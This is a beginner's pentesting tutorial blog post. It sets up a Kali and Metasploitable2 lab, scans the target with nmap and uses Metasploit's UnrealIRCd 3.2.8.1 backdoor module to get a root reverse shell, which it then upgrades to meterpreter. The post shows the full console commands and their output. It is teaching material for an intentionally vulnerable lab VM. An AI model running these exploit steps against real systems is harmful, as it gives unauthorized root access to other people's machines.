+++
author = "Chris Suttles"
categories = ["pentesting", "security", "metasploit", "kali", "Getting Started"]
date = 2018-11-30T12:40:19Z
description = ""
draft = false
cover = "/images/2018/11/2018-11-29_22-39-05.png"
slug = "penetration-testing-for-newbies"
tags = ["pentesting", "security", "metasploit", "kali", "Getting Started"]
title = "Penetration Testing for Newbies"
aliases = ["/penetration-testing-for-newbies/"]

+++


This is a brief introduction to penetration testing for people new to the subject. I recently started working on rounding out my skills with some security related studies, and I've really enjoyed the time I've spent studying penetration testing.Getting started with pentesting can be a bit daunting. There's a huge ecosystem of people, tools, techniques, and resources. It can be a little overwhelming.Here's some resources and a how I started getting some hands-on experience.

## Download Kali and Metasploitable2

You've probably heard of Kali Linux. If you haven't, that's ok too. It's a pentester linux distribution. There are several others, but Kali is the only one I have used and it seems to be pretty popular, which makes it a good choice for newbies. The more popular a tool is, the easier it is to find help.You can get Kali in several different formats (VMware, VirtualBox, ISO) [from the official release page](https://docs.kali.org/introduction/download-official-kali-linux-images). You can also get custom VMs [from Offensive Security](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/), which is also a great resource for tutorials.

Having a platform for attack is great, but what are we going to attack?Once again, Offensive Security is a great resource. Their free online guide ["Metasploit Unleashed"](https://www.offensive-security.com/metasploit-unleashed/) is a great resource. We will be using Metasploitable2 from Rapid7, which is available [here](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/). Please see the requirements for [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/requirements/) for details about lab setup. A quick summary: download a Kali VM, a Metasploitable 2 VM, launch in you hypervisor of choice with Kali connected to NAT and host-only network and Metasploitable 2 connected to just host-only.

## Baby Steps

Ok, now we have a lab with some VMs and we're ready to rock. Where do we start?There's a couple different frameworks for penetration testing, but they all follow a pretty similar flow. [Here's a good reference](http://blog.cipher.com/the-6-primary-phases-of-penetration-testing) with more detail, but the basic steps are something like the following:

1. Pre-Engagement Interactions
2. Reconnaissance or Open Source Intelligence (OSINT) Gathering
3. Threat Modeling & Vulnerability Identification
4. Exploitation
5. Post-Exploitation, Risk Analysis & Recommendations
6. Reporting

There's plenty to say about this stuff, but we're going to focus on steps 3-4, since we own the VMs in our lab and this is not a full pentest engagement. Steps 3-4 also happen to be a lot of fun!

We'll start by loading our VMs. We will log in to the Kali VM;`root/toor` is the default (change it). Once we have a desktop, let's discover our target.

## Threat Modeling & Vulnerability Identification (Discovery)

The nmap tool is your friend. We can find out a lot in a lab scenario by just hammering the box with nmap. We'll use really aggressive options since we don't need to worry about tripping an IDS/IPS. It's worth the time to really get to know nmap in depth, since it's a very useful tool for this stage of a pentest or CTF. You can find a great [nmap cheat sheet at stationX](https://www.stationx.net/nmap-cheat-sheet/).

{{< highlight markdown >}}
root@kali:~# nmap -A -T5 -p- 192.168.194.136
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-29 22:59 EST
Nmap scan report for 192.168.194.136
Host is up (0.00076s latency).
Not shown: 65511 closed ports
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
|_ssl-date: 2018-11-30T04:01:23+00:00; -9s from scanner time.                 [73/135]
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_DES_64_CBC_WITH_MD5
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
|_http-title: Metasploitable2 - Linux
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      43841/tcp  mountd
|   100005  1,2,3      50327/udp  mountd
|   100021  1,3,4      35235/udp  nlockmgr
|   100021  1,3,4      45907/tcp  nlockmgr
|   100024  1          41925/tcp  status
|_  100024  1          52724/udp  status
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
1099/tcp  open  java-rmi    Java RMI Registry
2049/tcp  open  nfs         2-4 (RPC #100003)
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info:
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 11
|   Capabilities flags: 43564
|   Some Capabilities: Support41Auth, SwitchToSSLAfterHandshake, LongColumnFlag, Speaks41ProtocolNew, ConnectWithDatabase, SupportsCompression,SupportsTransactions
|   Status: Autocommit
|_  Salt: tHK!_=TkAAcN>+Y`VmA>
3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
|_ssl-date: 2018-11-30T04:01:23+00:00; -9s from scanner time.
5900/tcp  open  vnc         VNC (protocol 3.3)
| vnc-info:
|   Protocol version: 3.3
|   Security types:
|_    VNC Authentication (2)
6000/tcp  open  X11         (access denied)
6667/tcp  open  irc         UnrealIRCd (Admin email admin@Metasploitable.LAN)
| irc-info:
|   users: 1
|   servers: 1
|   lusers: 1
|   lservers: 0
|   server: irc.Metasploitable.LAN
|   version: Unreal3.2.8.1. irc.Metasploitable.LAN
|   uptime: 0 days, 0:13:35
|   source ident: nmap
|   source host: 57A56AC.E25D2A63.FFFA6D49.IP
|_  error: Closing Link: tmehflenc[192.168.194.139] (Quit: tmehflenc)
6697/tcp  open  irc         UnrealIRCd
| irc-info:
|   users: 2
|   servers: 1
|   lusers: 2
|   lservers: 0
|   server: irc.Metasploitable.LAN
|   version: Unreal3.2.8.1. irc.Metasploitable.LAN
|   uptime: 0 days, 0:13:35
|   source ident: nmap
|   source host: 57A56AC.E25D2A63.FFFA6D49.IP
|_  error: Closing Link: vwnyqffzy[192.168.194.139] (Quit: vwnyqffzy)
|   source host: 57A56AC.E25D2A63.FFFA6D49.IP
|_  error: Closing Link: vwnyqffzy[192.168.194.139] (Quit: vwnyqffzy)
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/5.5
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
36159/tcp open  java-rmi    Java RMI Registry
41925/tcp open  status      1 (RPC #100024)
43841/tcp open  mountd      1-3 (RPC #100005)
45907/tcp open  nlockmgr    1-4 (RPC #100021)
MAC Address: 00:0C:29:43:CC:96 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m51s, deviation: 2h53m12s, median: -9s
|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   NetBIOS computer name:
|   Workgroup: WORKGROUP\x00
|_  System time: 2018-11-29T23:01:17-05:00
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE
HOP RTT     ADDRESS
1   0.75 ms 192.168.194.136

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 209.19 seconds
{{< / highlight >}}

So yeah. There's a lot to hack there. If you want to take it a step further, you can use the `--script` arg and supply a script. There's a lot of good ones that you get for free with nmap in Kali by default, but also of note:[https://github.com/vulnersCom/nmap-vulners](https://github.com/vulnersCom/nmap-vulners)

[https://github.com/scipag/vulscan](https://github.com/scipag/vulscan)

Both can be used to map a scan with version info directly to CVEs or exploitdb. It's a really good way to know easily what exploits are applicable to a target.

## Selecting a Target

In the sea of output above, let's focus on the IRC daemon we found. It's Unreal IRC 3.2.8.1. A quick search for the program and version pulls up an easy exploit:[https://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor](https://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor)

Most hosts won't have this many vulnerabilities, but given this is a test box specifically for this purpose, we can kindof blindly pick something and turn up a bulls eye. In a more realistic scenario, you'll have fewer choices and you'll need to decide based on what's available, your skill level, and available tools.

## Exploit the Target

Now that we picked a target service on our target machine, let's start trying to get access. Since we found a vulnerability with an exploit available in metasploit, let's fire up the console and use it.

{{< highlight markdown >}}
msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > options

Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  6667             yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set rhost 192.168.194.136
rhost => 192.168.194.136
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit

[*] Started reverse TCP double handler on 192.168.194.139:4444
[*] 192.168.194.136:6667 - Connected to 192.168.194.136:6667...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
[*] 192.168.194.136:6667 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo rZt3l3ydj5ITePyb;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "rZt3l3ydj5ITePyb\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.168.194.139:4444 -> 192.168.194.136:40211) at 2018-11-29 23:15:01 -0500
{{< / highlight >}}

We launch the msfconsole, select the exploit with `use`, check the `options`, set the RHOST (target) address, and run it with `exploit`. Now we have a shell.

{{< highlight markdown >}}
ls
Donation
LICENSE
aliases
badwords.channel.conf
badwords.message.conf
badwords.quit.conf
curl-ca-bundle.crt
dccallow.conf
doc
help.conf
ircd.log
ircd.pid
ircd.tune
modules
networks
spamfilter.conf
tmp
unreal
unrealircd.conf

whoami
firefart

id
uid=0(firefart) gid=0(root)
{{< / highlight >}}

The first bit of output is from the ls command. Then we check who we are with `whoami` and `id`. I'm user `firefart` because I previously ran [a dirty cow exploit](https://github.com/FireFart/dirtycow/blob/master/dirty.c) on this same box, which created the user firefart with a 0:0 uid:gid. The username is just semantics though, uid of 0 means that we got root on this box from very little effort.From there, we can improve our shell easily with metasploit, plant a reverse shell in cron, or really whatever we want, because we got root. Here's an example of upgrading our shell session (1) to a meterpreter shell, and using that to get a real shell with readline and all the usual shell goodies on the target host.

{{< highlight markdown >}}
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > use post/multi/manage/shell_to_meter
preter
msf post(multi/manage/shell_to_meterpreter) > options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the c
onnection
   LHOST                     no        IP of host that will receive the connection fro
m the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.

msf post(multi/manage/shell_to_meterpreter) > set session 1
session => 1
msf post(multi/manage/shell_to_meterpreter) > run
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.194.139:4433
[*] Sending stage (861480 bytes) to 192.168.194.136
[*] Meterpreter session 2 opened (192.168.194.139:4433 -> 192.168.194.136:55571) at 2$18-11-29 23:25:41 -0500
[*] Command stager progress: 100.00% (773/773 bytes)
[*] Post module execution completed
msf post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter >
meterpreter > ls
Listing: /etc/unreal
====================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100600/rw-------  1365    fil   2012-05-20 14:08:45 -0400  Donation
100600/rw-------  17992   fil   2012-05-20 14:08:45 -0400  LICENSE
40700/rwx------   4096    dir   2012-05-20 14:08:45 -0400  aliases
101204/-w----r--  1175    fil   2012-05-20 14:08:45 -0400  badwords.channel.conf
101204/-w----r--  1183    fil   2012-05-20 14:08:45 -0400  badwords.message.conf
101204/-w----r--  1121    fil   2012-05-20 14:08:45 -0400  badwords.quit.conf
100700/rwx------  242894  fil   2012-05-20 14:08:45 -0400  curl-ca-bundle.crt
100600/rw-------  1900    fil   2012-05-20 14:08:45 -0400  dccallow.conf
40700/rwx------   4096    dir   2012-05-20 14:08:45 -0400  doc
101204/-w----r--  49552   fil   2012-05-20 14:08:45 -0400  help.conf
100600/rw-------  3785    fil   2018-11-29 23:01:17 -0500  ircd.log
100600/rw-------  6       fil   2018-11-29 22:47:44 -0500  ircd.pid
100600/rw-------  5       fil   2018-11-29 23:27:42 -0500  ircd.tune
40700/rwx------   4096    dir   2012-05-20 14:08:45 -0400  modules
40700/rwx------   4096    dir   2012-05-20 14:08:45 -0400  networks
101204/-w----r--  5656    fil   2012-05-20 14:08:45 -0400  spamfilter.conf
40700/rwx------   4096    dir   2018-11-29 22:47:41 -0500  tmp
100700/rwx------  4042    fil   2012-05-20 14:08:45 -0400  unreal
101204/-w----r--  3884    fil   2012-05-20 14:11:37 -0400  unrealircd.conf

meterpreter > shell -t
[*] env TERM=xterm HISTFILE= /usr/bin/script -qc /bin/bash /dev/null
Process 12380 created.
Channel 2 created.
firefart@metasploitable:/etc/unreal# whoami
firefart
firefart@metasploitable:/etc/unreal# id
uid=0(firefart) gid=0(root)
firefart@metasploitable:/etc/unreal#
{{< / highlight >}}

## Summary/Next Steps

This is just a small sample and baby steps in pentesting. The first attack worked great, and we got root really easily. There's often a lot more steps, and there are many more tools to use. Kali comes with a ton of things preinstalled, and even then there are more that are useful for specific tasks that are easily installed via apt. You can learn a lot and have a lot of fun. If you try this lab, I'd also suggest trying some of the CTF challenges on [vulnhub](https://www.vulnhub.com/). Some friends and I all did an easy one ([Rickdiculously Easy](https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/)), a simple Rick and Morty themed 'boot 2 root' CTF. It was a lot more challenging and also really fun comparing notes with my buddies to see how everybody approached it. We managed to capture all of the flags, and so far, nobody did it the same way. We still have one friend working on it, so I'll save that one for another post. One thing I learned from that CTF is that notes are important while you are working. It will make it a lot easier to avoid repeating yourself, and a lot easier to explain how you did it when you finish. I had to scroll through my console history to figure out how I got root on that one because I actually forgot! I've really enjoyed learning about pentesting and I'm still working on it. I found a lot of great resources in the course of studying for and passing the CompTia Pentest+ exam. I'm also actively working on the CEH (certified ethical hacker) and OSCP (Offensive Security Certified Professional) certifications.I'd love to hear from you on [Twitter](https://twitter.com/moshtmux) or [LinkedIn](https://www.linkedin.com/in/chrissuttles/) with questions or suggestions on my writing, tools or technology. Thanks for reading!



